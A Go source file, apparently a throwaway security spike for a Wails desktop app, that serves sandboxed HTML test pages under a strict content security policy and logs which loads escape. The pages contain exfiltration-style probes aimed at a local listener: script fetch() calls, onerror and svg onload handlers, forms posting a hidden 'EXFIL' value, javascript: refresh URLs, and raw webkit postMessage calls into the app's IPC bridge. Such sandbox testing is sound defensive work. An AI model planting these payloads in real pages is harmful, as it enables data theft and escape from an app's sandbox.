package main

// SPIKE P1 (throwaway, never merged): the H3 static host route, plus a log-only
// binding. /vibe-view/<token>/page?v=<variant>&o=<origin> renders a Go html/template
// page with H3's response CSP; /vibe-view/<token>/assets/<file> serves static files.

import (
	"bytes"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/wailsapp/wails/v2/pkg/options/assetserver"
)

const (
	spikeTok = "5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a"
	spikeL   = "http://127.0.0.1:39547"
)

var spikeMu sync.Mutex

func spikeLogf(format string, a ...any) {
	spikeMu.Lock()
	defer spikeMu.Unlock()
	p := os.Getenv("SPIKE_LOG")
	if p == "" {
		p = "/tmp/spike-a.log"
	}
	f, err := os.OpenFile(p, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s %s\n", time.Now().Format("15:04:05.000"), fmt.Sprintf(format, a...))
}

// SpikeProbe only logs: a line means the IPC reached Go.
func (a *App) SpikeProbe(tag string) string {
	spikeLogf("IPC SpikeProbe %s", tag)
	return "ok"
}

// SpikeMode says whether the runner runs (SPIKE_MODE env).
func (a *App) SpikeMode() string { return os.Getenv("SPIKE_MODE") }

func spikeWrap(inner assetserver.Middleware) assetserver.Middleware {
	return func(next http.Handler) http.Handler {
		h := inner(next)
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			p := r.URL.Path
			dest := r.Header.Get("Sec-Fetch-Dest")
			if os.Getenv("SPIKE_LOGALL") != "" || dest == "iframe" || dest == "frame" || strings.HasPrefix(p, "/vibe-view/"+spikeTok) || p == "/" || p == "/index.html" || strings.HasPrefix(p, "/vibe-view/") {
				spikeLogf("REQ %s %s dest=%q site=%q mode=%q user=%q accept=%q referer=%q", r.Method, r.URL.RequestURI(),
					dest, r.Header.Get("Sec-Fetch-Site"), r.Header.Get("Sec-Fetch-Mode"), r.Header.Get("Sec-Fetch-User"),
					r.Header.Get("Accept"), r.Header.Get("Referer"))
			}
			if strings.HasPrefix(p, "/vibe-view/"+spikeTok+"/") {
				spikeServe(w, r)
				return
			}
			h.ServeHTTP(w, r)
		})
	}
}

func spikeServe(w http.ResponseWriter, r *http.Request) {
	if p := r.URL.Path; strings.HasSuffix(p, "/") || strings.HasSuffix(p, "/index.html") {
		w.Header().Set("Content-Security-Policy", "default-src 'none'")
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	rest := strings.TrimPrefix(r.URL.Path, "/vibe-view/"+spikeTok+"/")
	q := r.URL.Query()
	origin := q.Get("o")
	base := "/vibe-view/" + spikeTok
	h := w.Header()
	h.Set("X-Content-Type-Options", "nosniff")
	h.Set("Cache-Control", "no-store")
	switch {
	case rest == "page":
		if q.Get("c") != "1" {
			a := origin + base + "/assets/"
			h.Set("Content-Security-Policy", "sandbox; default-src 'none'; script-src 'none'; style-src "+a+" 'unsafe-inline'; img-src "+a+" data:; font-src "+a+"; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'")
		}
		h.Set("Content-Type", "text/html; charset=utf-8")
		fm := template.FuncMap{
			"link": func(kv ...string) string {
				u := url.Values{}
				u.Set("v", q.Get("v"))
				u.Set("o", origin)
				for i := 0; i+1 < len(kv); i += 2 {
					u.Set(kv[i], kv[i+1])
				}
				return base + "/page?" + u.Encode()
			},
			"pageurl": func() string { return base + "/page?v=img-target&o=" + url.QueryEscape(origin) },
		}
		body, ok := spikeVariants[q.Get("v")]
		if !ok {
			body = spikeVariants["inert"]
		}
		body = strings.ReplaceAll(body, "@@L@@", spikeL)
		body = strings.ReplaceAll(body, "@@O@@", origin)
		t, err := template.New("p").Funcs(fm).Parse(body)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		var buf bytes.Buffer
		_ = t.Execute(&buf, map[string]string{"Region": q.Get("region")})
		w.Write(buf.Bytes())
	case strings.HasPrefix(rest, "assets/"):
		name := strings.TrimPrefix(rest, "assets/")
		switch name {
		case "ok.css":
			h.Set("Content-Type", "text/css")
			w.Write([]byte("body{outline:1px solid #0a0}"))
		case "ok.png":
			h.Set("Content-Type", "image/png")
			w.Write(spikePNG)
		case "ok.ttf":
			h.Set("Content-Type", "font/ttf")
			b, _ := os.ReadFile("/usr/share/fonts/aajohan-comfortaa-fonts/Comfortaa-Regular.otf")
			w.Write(b)
		case "ok.js":
			h.Set("Content-Type", "text/javascript")
			w.Write([]byte("fetch('" + spikeL + "/v/assets-js')"))
		default:
			http.NotFound(w, r)
		}
	default:
		http.NotFound(w, r)
	}
}

var spikePNG = []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 'I', 'H', 'D', 'R', 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 0x1f, 0x15, 0xc4, 0x89, 0, 0, 0, 0x0d, 'I', 'D', 'A', 'T', 0x78, 0x9c, 0x63, 0xf8, 0xcf, 0xc0, 0xf0, 0x1f, 0, 0x05, 0, 0x01, 0xff, 0x89, 0x99, 0x3d, 0x1d, 0, 0, 0, 0, 'I', 'E', 'N', 'D', 0xae, 0x42, 0x60, 0x82}

const full = `style="display:block;position:fixed;inset:0;background:#fc0;font:40px sans-serif"`

var spikeVariants = map[string]string{
	"inert": `<!doctype html><html><head><meta charset="utf-8"><title>inert</title>
<link rel="stylesheet" href="assets/ok.css">
<link rel="stylesheet" href="@@L@@/v/link-css.css">
<link rel="prefetch" href="@@L@@/v/prefetch"><link rel="preconnect" href="@@L@@"><link rel="dns-prefetch" href="@@L@@"><link rel="icon" href="@@L@@/v/icon">
<style>
@import url(@@L@@/v/css-import.css);
@font-face{font-family:okf;src:url(assets/ok.ttf)}
@font-face{font-family:extf;src:url(@@L@@/v/css-font)}
body{background:url(@@L@@/v/css-bg);font-family:okf,extf}
h1{background:url(assets/ok.png)}
.pg{background:url({{pageurl}}&from=css)}
</style></head><body background="@@L@@/v/body-bg">
<h1 class="pg">static</h1>
<script>fetch('@@L@@/v/inline-script')</script>
<script src="@@L@@/v/ext-script.js"></script>
<script src="assets/ok.js"></script>
<img src="x" onerror="fetch('@@L@@/v/onerror')">
<img src="@@L@@/v/img-external"><img src="assets/ok.png"><img src="{{pageurl}}&from=img">
<svg onload="fetch('@@L@@/v/svg-onload')"><script>fetch('@@L@@/v/svg-script')</script></svg>
<object data="@@L@@/v/object"></object><embed src="@@L@@/v/embed">
<iframe src="@@L@@/v/iframe-ext"></iframe><iframe srcdoc="<script>fetch('@@L@@/v/srcdoc')</script>"></iframe>
<video poster="@@L@@/v/poster"></video><audio src="@@L@@/v/audio" preload="auto"></audio>
<input type="image" src="@@L@@/v/input-image">
<base href="@@L@@/v/base/"><img src="rel-after-base">
</body></html>`,
	"refresh-outside":   `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=@@L@@/v/refresh-outside"></head><body>refresh</body></html>`,
	"refresh-js":        `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=javascript:fetch('@@L@@/v/refresh-js')"></head><body>refresh</body></html>`,
	"refresh-self":      `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url={{link "region" "refreshed"}}"></head><body>refresh-self region={{.Region}}</body></html>`,
	"refresh-root":      `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=/"></head><body>refresh</body></html>`,
	"click-outside":     `<!doctype html><html><body><a href="@@L@@/v/click-outside" ` + full + `>outside link</a></body></html>`,
	"click-js":          `<!doctype html><html><body><a href="javascript:fetch('@@L@@/v/click-js')" ` + full + `>js link</a></body></html>`,
	"click-form-get":    `<!doctype html><html><body><form action="@@L@@/v/form-get" method="get"><input type="hidden" name="s" value="EXFIL"><button ` + full + `>go</button></form></body></html>`,
	"click-form-post":   `<!doctype html><html><body><form action="@@L@@/v/form-post" method="post"><input type="hidden" name="s" value="EXFIL"><button ` + full + `>go</button></form></body></html>`,
	"click-rerender":    `<!doctype html><html><body><a href="{{link "region" "east"}}" ` + full + `>region={{.Region}} (click to re-render)</a></body></html>`,
	"click-root":        `<!doctype html><html><body><a href="/" ` + full + `>to root</a></body></html>`,
	"click-index":       `<!doctype html><html><body><a href="/index.html" ` + full + `>to index.html</a></body></html>`,
	"click-ping":        `<!doctype html><html><body><a ping="@@L@@/v/ping" href="{{link "region" "pinged"}}" ` + full + `>ping</a></body></html>`,
	"click-blank":       `<!doctype html><html><body><a target="_blank" href="@@L@@/v/blank" ` + full + `>blank</a></body></html>`,
	"click-download":    `<!doctype html><html><body><a download href="assets/ok.css" ` + full + `>download</a></body></html>`,
	"lnk-preconnect":    `<!doctype html><html><head><meta charset="utf-8"><link rel="preconnect" href="@@L@@"></head><body>lnk preconnect</body></html>`,
	"lnk-dns-prefetch":  `<!doctype html><html><head><meta charset="utf-8"><link rel="dns-prefetch" href="@@L@@"></head><body>lnk dns-prefetch</body></html>`,
	"lnk-prefetch":      `<!doctype html><html><head><meta charset="utf-8"><link rel="prefetch" href="@@L@@/v/lnk-prefetch"></head><body>lnk prefetch</body></html>`,
	"lnk-prerender":     `<!doctype html><html><head><meta charset="utf-8"><link rel="prerender" href="@@L@@/v/lnk-prerender"></head><body>lnk prerender</body></html>`,
	"lnk-icon":          `<!doctype html><html><head><meta charset="utf-8"><link rel="icon" href="@@L@@/v/lnk-icon"></head><body>lnk icon</body></html>`,
	"lnk-stylesheet":    `<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="@@L@@/v/lnk-stylesheet.css"></head><body>lnk stylesheet</body></html>`,
	"lnk-preload":       `<!doctype html><html><head><meta charset="utf-8"><link rel="preload" as="image" href="@@L@@/v/lnk-preload"></head><body>lnk preload</body></html>`,
	"lnk-modulepreload": `<!doctype html><html><head><meta charset="utf-8"><link rel="modulepreload" href="@@L@@/v/lnk-modulepreload.js"></head><body>lnk modulepreload</body></html>`,
	"ipc": `<!doctype html><html><body>ipc<script>
try { window.webkit.messageHandlers.external.postMessage('C{"name":"main.App.SpikeProbe","args":["frame-raw-ipc"],"callbackID":"x"}'); } catch (e) { }
try { window.webkit.messageHandlers.external.postMessage('BOL@@L@@/v/frame-browseropen'); } catch (e) { }
fetch('@@L@@/v/ipc-script-ran');
</script></body></html>`,
	// macOS only (needs /etc/resolver/spike.test, see spike/pagehost/mac/P1-MAC-RUN.md): host names that exercise DNS.
	"lnk-dns-prefetch-name":  `<!doctype html><html><head><meta charset="utf-8"><link rel="dns-prefetch" href="http://pf-name.spike.test:39547/"></head><body>x</body></html>`,
	"lnk-preconnect-name":    `<!doctype html><html><head><meta charset="utf-8"><link rel="preconnect" href="http://pc-name.spike.test:39547/"></head><body>x</body></html>`,
	"click-outside-name":     `<!doctype html><html><body><a href="http://outside-name.spike.test:39547/v/click-outside-name" ` + full + `>outside by name</a></body></html>`,
	"click-blank-name":       `<!doctype html><html><body><a target="_blank" href="http://blank-name.spike.test:39547/v/click-blank-name" ` + full + `>blank by name</a></body></html>`,
	"lnk-dns-prefetch-sname": `<!doctype html><html><head><meta charset="utf-8"><link rel="dns-prefetch" href="https://spf-name.spike.test:39547/"></head><body>x</body></html>`,
	"lnk-preconnect-sname":   `<!doctype html><html><head><meta charset="utf-8"><link rel="preconnect" href="https://spc-name.spike.test:39547/"></head><body>x</body></html>`,
	"click-outside-sname":    `<!doctype html><html><body><a href="https://soutside-name.spike.test:39547/v/click-outside-sname" ` + full + `>outside by name (https)</a></body></html>`,
	"click-blank-sname":      `<!doctype html><html><body><a target="_blank" href="https://sblank-name.spike.test:39547/v/click-blank-sname" ` + full + `>blank by name (https)</a></body></html>`,
	"inert-sname":            `<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="https://scss-name.spike.test:39547/v/css"></head><body><img src="https://simg-name.spike.test:39547/v/img"></body></html>`,
	"img-target":             `<!doctype html><html><body>img-target</body></html>`,
}
